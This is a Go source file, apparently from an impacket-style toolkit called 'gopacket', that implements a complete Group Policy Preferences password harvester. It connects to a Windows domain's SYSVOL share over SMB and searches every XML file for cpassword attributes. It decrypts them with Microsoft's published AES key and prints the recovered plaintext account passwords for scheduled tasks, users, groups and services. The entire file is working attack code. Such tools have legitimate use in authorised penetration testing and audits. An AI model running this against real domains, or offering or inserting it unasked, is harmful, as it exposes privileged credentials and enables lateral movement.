package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/xml"
	"flag"
	"fmt"
	"os"
	"path"
	"strings"
	"time"

	"gopacket/internal/build"
	"gopacket/pkg/flags"
	"gopacket/pkg/session"
	"gopacket/pkg/smb"
)

// Microsoft's published AES key for GPP password decryption
// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
var gppKey = []byte{
	0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
	0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
	0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
	0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
}

// Fixed IV (all zeros) used by Microsoft
var gppIV = make([]byte, 16)

var (
	xmlFile = flag.String("xmlfile", "", "Group Policy Preferences XML file to parse locally")
	share   = flag.String("share", "SYSVOL", "SMB Share to search")
	baseDir = flag.String("base-dir", "/", "Directory to search in")
)

func main() {
	opts := flags.Parse()

	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	target := opts.TargetStr

	// Handle LOCAL mode for parsing local XML files
	if strings.ToUpper(target) == "LOCAL" {
		if *xmlFile == "" {
			logError("LOCAL mode requires -xmlfile argument")
			os.Exit(1)
		}
		parseLocalXMLFile(*xmlFile)
		return
	}

	// Parse target string
	tgt, creds, err := session.ParseTargetString(target)
	if err != nil {
		logError("Failed to parse target: %v", err)
		os.Exit(1)
	}

	opts.ApplyToSession(&tgt, &creds)

	// Prompt for password if needed
	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			logError("Failed to get password: %v", err)
			os.Exit(1)
		}
	}

	// Connect to SMB
	client := smb.NewClient(tgt, &creds)
	if err := client.Connect(); err != nil {
		logError("SMB connection failed: %v", err)
		os.Exit(1)
	}
	defer client.Close()

	// List shares
	logInfo("Listing shares...")
	shares, err := client.ListShares()
	if err != nil {
		logError("Failed to list shares: %v", err)
		os.Exit(1)
	}
	for _, s := range shares {
		fmt.Printf("  - %s\n", s)
	}
	fmt.Println()

	// Connect to target share
	if err := client.UseShare(*share); err != nil {
		logError("Failed to connect to share %s: %v", *share, err)
		os.Exit(1)
	}

	// Search for XML files with cpassword
	logInfo("Searching *.xml files...")
	findCPasswords(client, *baseDir)
}

func parseLocalXMLFile(filename string) {
	logDebug("Opening %s XML file for reading...", filename)

	data, err := os.ReadFile(filename)
	if err != nil {
		logError("Failed to read file: %v", err)
		os.Exit(1)
	}

	results := parseXMLContent(filename, string(data))
	showResults(results)
}

func findCPasswords(client *smb.Client, baseDir string) {
	// Normalize base directory - remove leading slash for SMB
	baseDir = strings.TrimPrefix(baseDir, "/")
	baseDir = strings.TrimPrefix(baseDir, "\\")

	// Breadth-first search for XML files
	searchDirs := []string{baseDir}

	for len(searchDirs) > 0 {
		var nextDirs []string

		for _, dir := range searchDirs {
			logDebug("Searching in %s", dir)

			files, err := client.Ls(dir)
			if err != nil {
				logDebug("Error listing %s: %v", dir, err)
				continue
			}

			for _, f := range files {
				name := f.Name()
				if name == "." || name == ".." {
					continue
				}

				fullPath := path.Join(dir, name)

				if f.IsDir() {
					logDebug("Found directory %s/", name)
					nextDirs = append(nextDirs, fullPath)
				} else {
					if strings.HasSuffix(strings.ToLower(name), ".xml") {
						logDebug("Found matching file %s", fullPath)
						processXMLFile(client, fullPath)
					} else {
						logDebug("Found file %s", name)
					}
				}
			}
		}

		searchDirs = nextDirs
		logDebug("Next iteration with %d folders.", len(nextDirs))
	}
}

func processXMLFile(client *smb.Client, filePath string) {
	// Read file content
	content, err := client.Cat(filePath)
	if err != nil {
		logDebug("Error reading %s: %v", filePath, err)
		return
	}

	// Check if file contains cpassword
	if !strings.Contains(content, "cpassword") {
		logDebug("No cpassword was found in %s", filePath)
		return
	}

	logDebug("File content:\n%s", content)

	results := parseXMLContent(filePath, content)
	if len(results) > 0 {
		showResults(results)
	}
}

// GPPResult holds extracted GPP password data
type GPPResult struct {
	TagName    string
	File       string
	Attributes map[string]string
}

func parseXMLContent(filename, content string) []GPPResult {
	var results []GPPResult

	// Try to determine XML type from root element
	decoder := xml.NewDecoder(strings.NewReader(content))
	var rootName string
	for {
		token, err := decoder.Token()
		if err != nil {
			break
		}
		if se, ok := token.(xml.StartElement); ok {
			rootName = se.Name.Local
			break
		}
	}

	// Parse based on XML type
	switch rootName {
	case "ScheduledTasks":
		results = parseScheduledTasks(filename, content)
	case "Groups":
		results = parseGroups(filename, content)
	case "Services":
		results = parseServices(filename, content)
	case "DataSources":
		results = parseDataSources(filename, content)
	case "Drives":
		results = parseDrives(filename, content)
	case "Printers":
		results = parsePrinters(filename, content)
	default:
		// Generic parsing for unknown types
		results = parseGeneric(filename, content, rootName)
	}

	return results
}

// XML structures for parsing
type ScheduledTasksXML struct {
	XMLName xml.Name            `xml:"ScheduledTasks"`
	Tasks   []ScheduledTaskXML  `xml:",any"`
}

type ScheduledTaskXML struct {
	XMLName    xml.Name           `xml:""`
	Name       string             `xml:"name,attr"`
	Changed    string             `xml:"changed,attr"`
	Properties TaskPropertiesXML  `xml:"Properties"`
}

type TaskPropertiesXML struct {
	RunAs     string `xml:"runAs,attr"`
	CPassword string `xml:"cpassword,attr"`
	UserName  string `xml:"userName,attr"`
	Password  string `xml:"password,attr"`
}

func parseScheduledTasks(filename, content string) []GPPResult {
	var results []GPPResult
	var tasks ScheduledTasksXML

	if err := xml.Unmarshal([]byte(content), &tasks); err != nil {
		logDebug("XML parse error: %v", err)
		return results
	}

	for _, task := range tasks.Tasks {
		cpass := task.Properties.CPassword
		if cpass == "" {
			continue
		}

		result := GPPResult{
			TagName: "ScheduledTasks",
			File:    filename,
			Attributes: map[string]string{
				"name":      task.Name,
				"runAs":     task.Properties.RunAs,
				"cpassword": cpass,
				"password":  decryptCPassword(cpass),
				"changed":   task.Changed,
			},
		}
		results = append(results, result)
	}

	return results
}

type GroupsXML struct {
	XMLName xml.Name   `xml:"Groups"`
	Users   []UserXML  `xml:"User"`
	Groups  []GroupXML `xml:"Group"`
}

type UserXML struct {
	Changed    string             `xml:"changed,attr"`
	Properties UserPropertiesXML  `xml:"Properties"`
}

type GroupXML struct {
	Changed    string             `xml:"changed,attr"`
	Properties UserPropertiesXML  `xml:"Properties"`
}

type UserPropertiesXML struct {
	NewName   string `xml:"newName,attr"`
	UserName  string `xml:"userName,attr"`
	CPassword string `xml:"cpassword,attr"`
}

func parseGroups(filename, content string) []GPPResult {
	var results []GPPResult
	var groups GroupsXML

	if err := xml.Unmarshal([]byte(content), &groups); err != nil {
		logDebug("XML parse error: %v", err)
		return results
	}

	// Parse Users
	for _, user := range groups.Users {
		cpass := user.Properties.CPassword
		if cpass == "" {
			continue
		}

		result := GPPResult{
			TagName: "Groups",
			File:    filename,
			Attributes: map[string]string{
				"newName":   user.Properties.NewName,
				"userName":  user.Properties.UserName,
				"cpassword": cpass,
				"password":  decryptCPassword(cpass),
				"changed":   user.Changed,
			},
		}
		results = append(results, result)
	}

	// Parse Groups
	for _, group := range groups.Groups {
		cpass := group.Properties.CPassword
		if cpass == "" {
			continue
		}

		result := GPPResult{
			TagName: "Groups",
			File:    filename,
			Attributes: map[string]string{
				"newName":   group.Properties.NewName,
				"userName":  group.Properties.UserName,
				"cpassword": cpass,
				"password":  decryptCPassword(cpass),
				"changed":   group.Changed,
			},
		}
		results = append(results, result)
	}

	return results
}

type ServicesXML struct {
	XMLName  xml.Name     `xml:"NTServices"`
	Services []ServiceXML `xml:"NTService"`
}

type ServiceXML struct {
	Changed    string                `xml:"changed,attr"`
	Name       string                `xml:"name,attr"`
	Properties ServicePropertiesXML  `xml:"Properties"`
}

type ServicePropertiesXML struct {
	AccountName string `xml:"accountName,attr"`
	CPassword   string `xml:"cpassword,attr"`
}

func parseServices(filename, content string) []GPPResult {
	var results []GPPResult
	var services ServicesXML

	if err := xml.Unmarshal([]byte(content), &services); err != nil {
		logDebug("XML parse error: %v", err)
		return results
	}

	for _, svc := range services.Services {
		cpass := svc.Properties.CPassword
		if cpass == "" {
			continue
		}

		result := GPPResult{
			TagName: "Services",
			File:    filename,
			Attributes: map[string]string{
				"name":        svc.Name,
				"accountName": svc.Properties.AccountName,
				"cpassword":   cpass,
				"password":    decryptCPassword(cpass),
				"changed":     svc.Changed,
			},
		}
		results = append(results, result)
	}

	return results
}

func parseDataSources(filename, content string) []GPPResult {
	return parseGeneric(filename, content, "DataSources")
}

func parseDrives(filename, content string) []GPPResult {
	return parseGeneric(filename, content, "Drives")
}

func parsePrinters(filename, content string) []GPPResult {
	return parseGeneric(filename, content, "Printers")
}

func parseGeneric(filename, content, tagName string) []GPPResult {
	var results []GPPResult

	// Simple regex-like extraction for cpassword
	// Look for cpassword="..." patterns
	for _, line := range strings.Split(content, "\n") {
		if !strings.Contains(line, "cpassword") {
			continue
		}

		cpass := extractAttribute(line, "cpassword")
		if cpass == "" {
			continue
		}

		result := GPPResult{
			TagName: tagName,
			File:    filename,
			Attributes: map[string]string{
				"userName":  extractAttribute(line, "userName"),
				"newName":   extractAttribute(line, "newName"),
				"cpassword": cpass,
				"password":  decryptCPassword(cpass),
				"changed":   extractAttribute(line, "changed"),
			},
		}
		results = append(results, result)
	}

	return results
}

func extractAttribute(line, attr string) string {
	// Look for attr="value" or attr='value'
	patterns := []string{
		attr + `="`,
		attr + `='`,
	}

	for _, prefix := range patterns {
		idx := strings.Index(line, prefix)
		if idx == -1 {
			continue
		}

		start := idx + len(prefix)
		quote := line[idx+len(attr)+1]
		end := strings.Index(line[start:], string(quote))
		if end == -1 {
			continue
		}

		return line[start : start+end]
	}

	return ""
}

func decryptCPassword(cpassword string) string {
	if cpassword == "" {
		logDebug("cpassword is empty, cannot decrypt anything.")
		return ""
	}

	// Handle base64 padding
	pad := len(cpassword) % 4
	if pad == 1 {
		cpassword = cpassword[:len(cpassword)-1]
	} else if pad == 2 || pad == 3 {
		cpassword += strings.Repeat("=", 4-pad)
	}

	// Decode base64
	encrypted, err := base64.StdEncoding.DecodeString(cpassword)
	if err != nil {
		logDebug("Base64 decode error: %v", err)
		return ""
	}

	// Decrypt using AES-256-CBC
	block, err := aes.NewCipher(gppKey)
	if err != nil {
		logDebug("AES cipher error: %v", err)
		return ""
	}

	if len(encrypted) < aes.BlockSize {
		logDebug("Ciphertext too short")
		return ""
	}

	mode := cipher.NewCBCDecrypter(block, gppIV)
	decrypted := make([]byte, len(encrypted))
	mode.CryptBlocks(decrypted, encrypted)

	// Remove PKCS7 padding
	decrypted = pkcs7Unpad(decrypted)
	if decrypted == nil {
		logDebug("Invalid padding")
		return ""
	}

	// Decode from UTF-16LE
	return decodeUTF16LE(decrypted)
}

func pkcs7Unpad(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}

	padding := int(data[len(data)-1])
	if padding > len(data) || padding > aes.BlockSize {
		return nil
	}

	// Verify padding
	for i := len(data) - padding; i < len(data); i++ {
		if data[i] != byte(padding) {
			return nil
		}
	}

	return data[:len(data)-padding]
}

func decodeUTF16LE(data []byte) string {
	if len(data)%2 != 0 {
		data = append(data, 0)
	}

	var buf bytes.Buffer
	for i := 0; i < len(data)-1; i += 2 {
		r := rune(data[i]) | rune(data[i+1])<<8
		if r == 0 {
			break
		}
		buf.WriteRune(r)
	}

	return buf.String()
}

func showResults(results []GPPResult) {
	for _, result := range results {
		logInfo("Found a %s XML file:", result.TagName)
		logInfo("  %-10s: %s", "file", result.File)

		// Display attributes in a specific order, excluding cpassword
		order := []string{"name", "newName", "userName", "runAs", "accountName", "password", "changed"}
		for _, key := range order {
			if val, ok := result.Attributes[key]; ok && val != "" {
				logInfo("  %-10s: %s", key, val)
			}
		}
		fmt.Println()
	}
}

func logInfo(format string, args ...interface{}) {
	prefix := "[*] "
	if build.Timestamp {
		prefix = time.Now().Format("2006-01-02 15:04:05 ") + prefix
	}
	fmt.Printf(prefix+format+"\n", args...)
}

func logError(format string, args ...interface{}) {
	prefix := "[-] "
	if build.Timestamp {
		prefix = time.Now().Format("2006-01-02 15:04:05 ") + prefix
	}
	fmt.Fprintf(os.Stderr, prefix+format+"\n", args...)
}

func logDebug(format string, args ...interface{}) {
	if !build.Debug {
		return
	}
	prefix := "[DEBUG] "
	if build.Timestamp {
		prefix = time.Now().Format("2006-01-02 15:04:05 ") + prefix
	}
	fmt.Printf(prefix+format+"\n", args...)
}
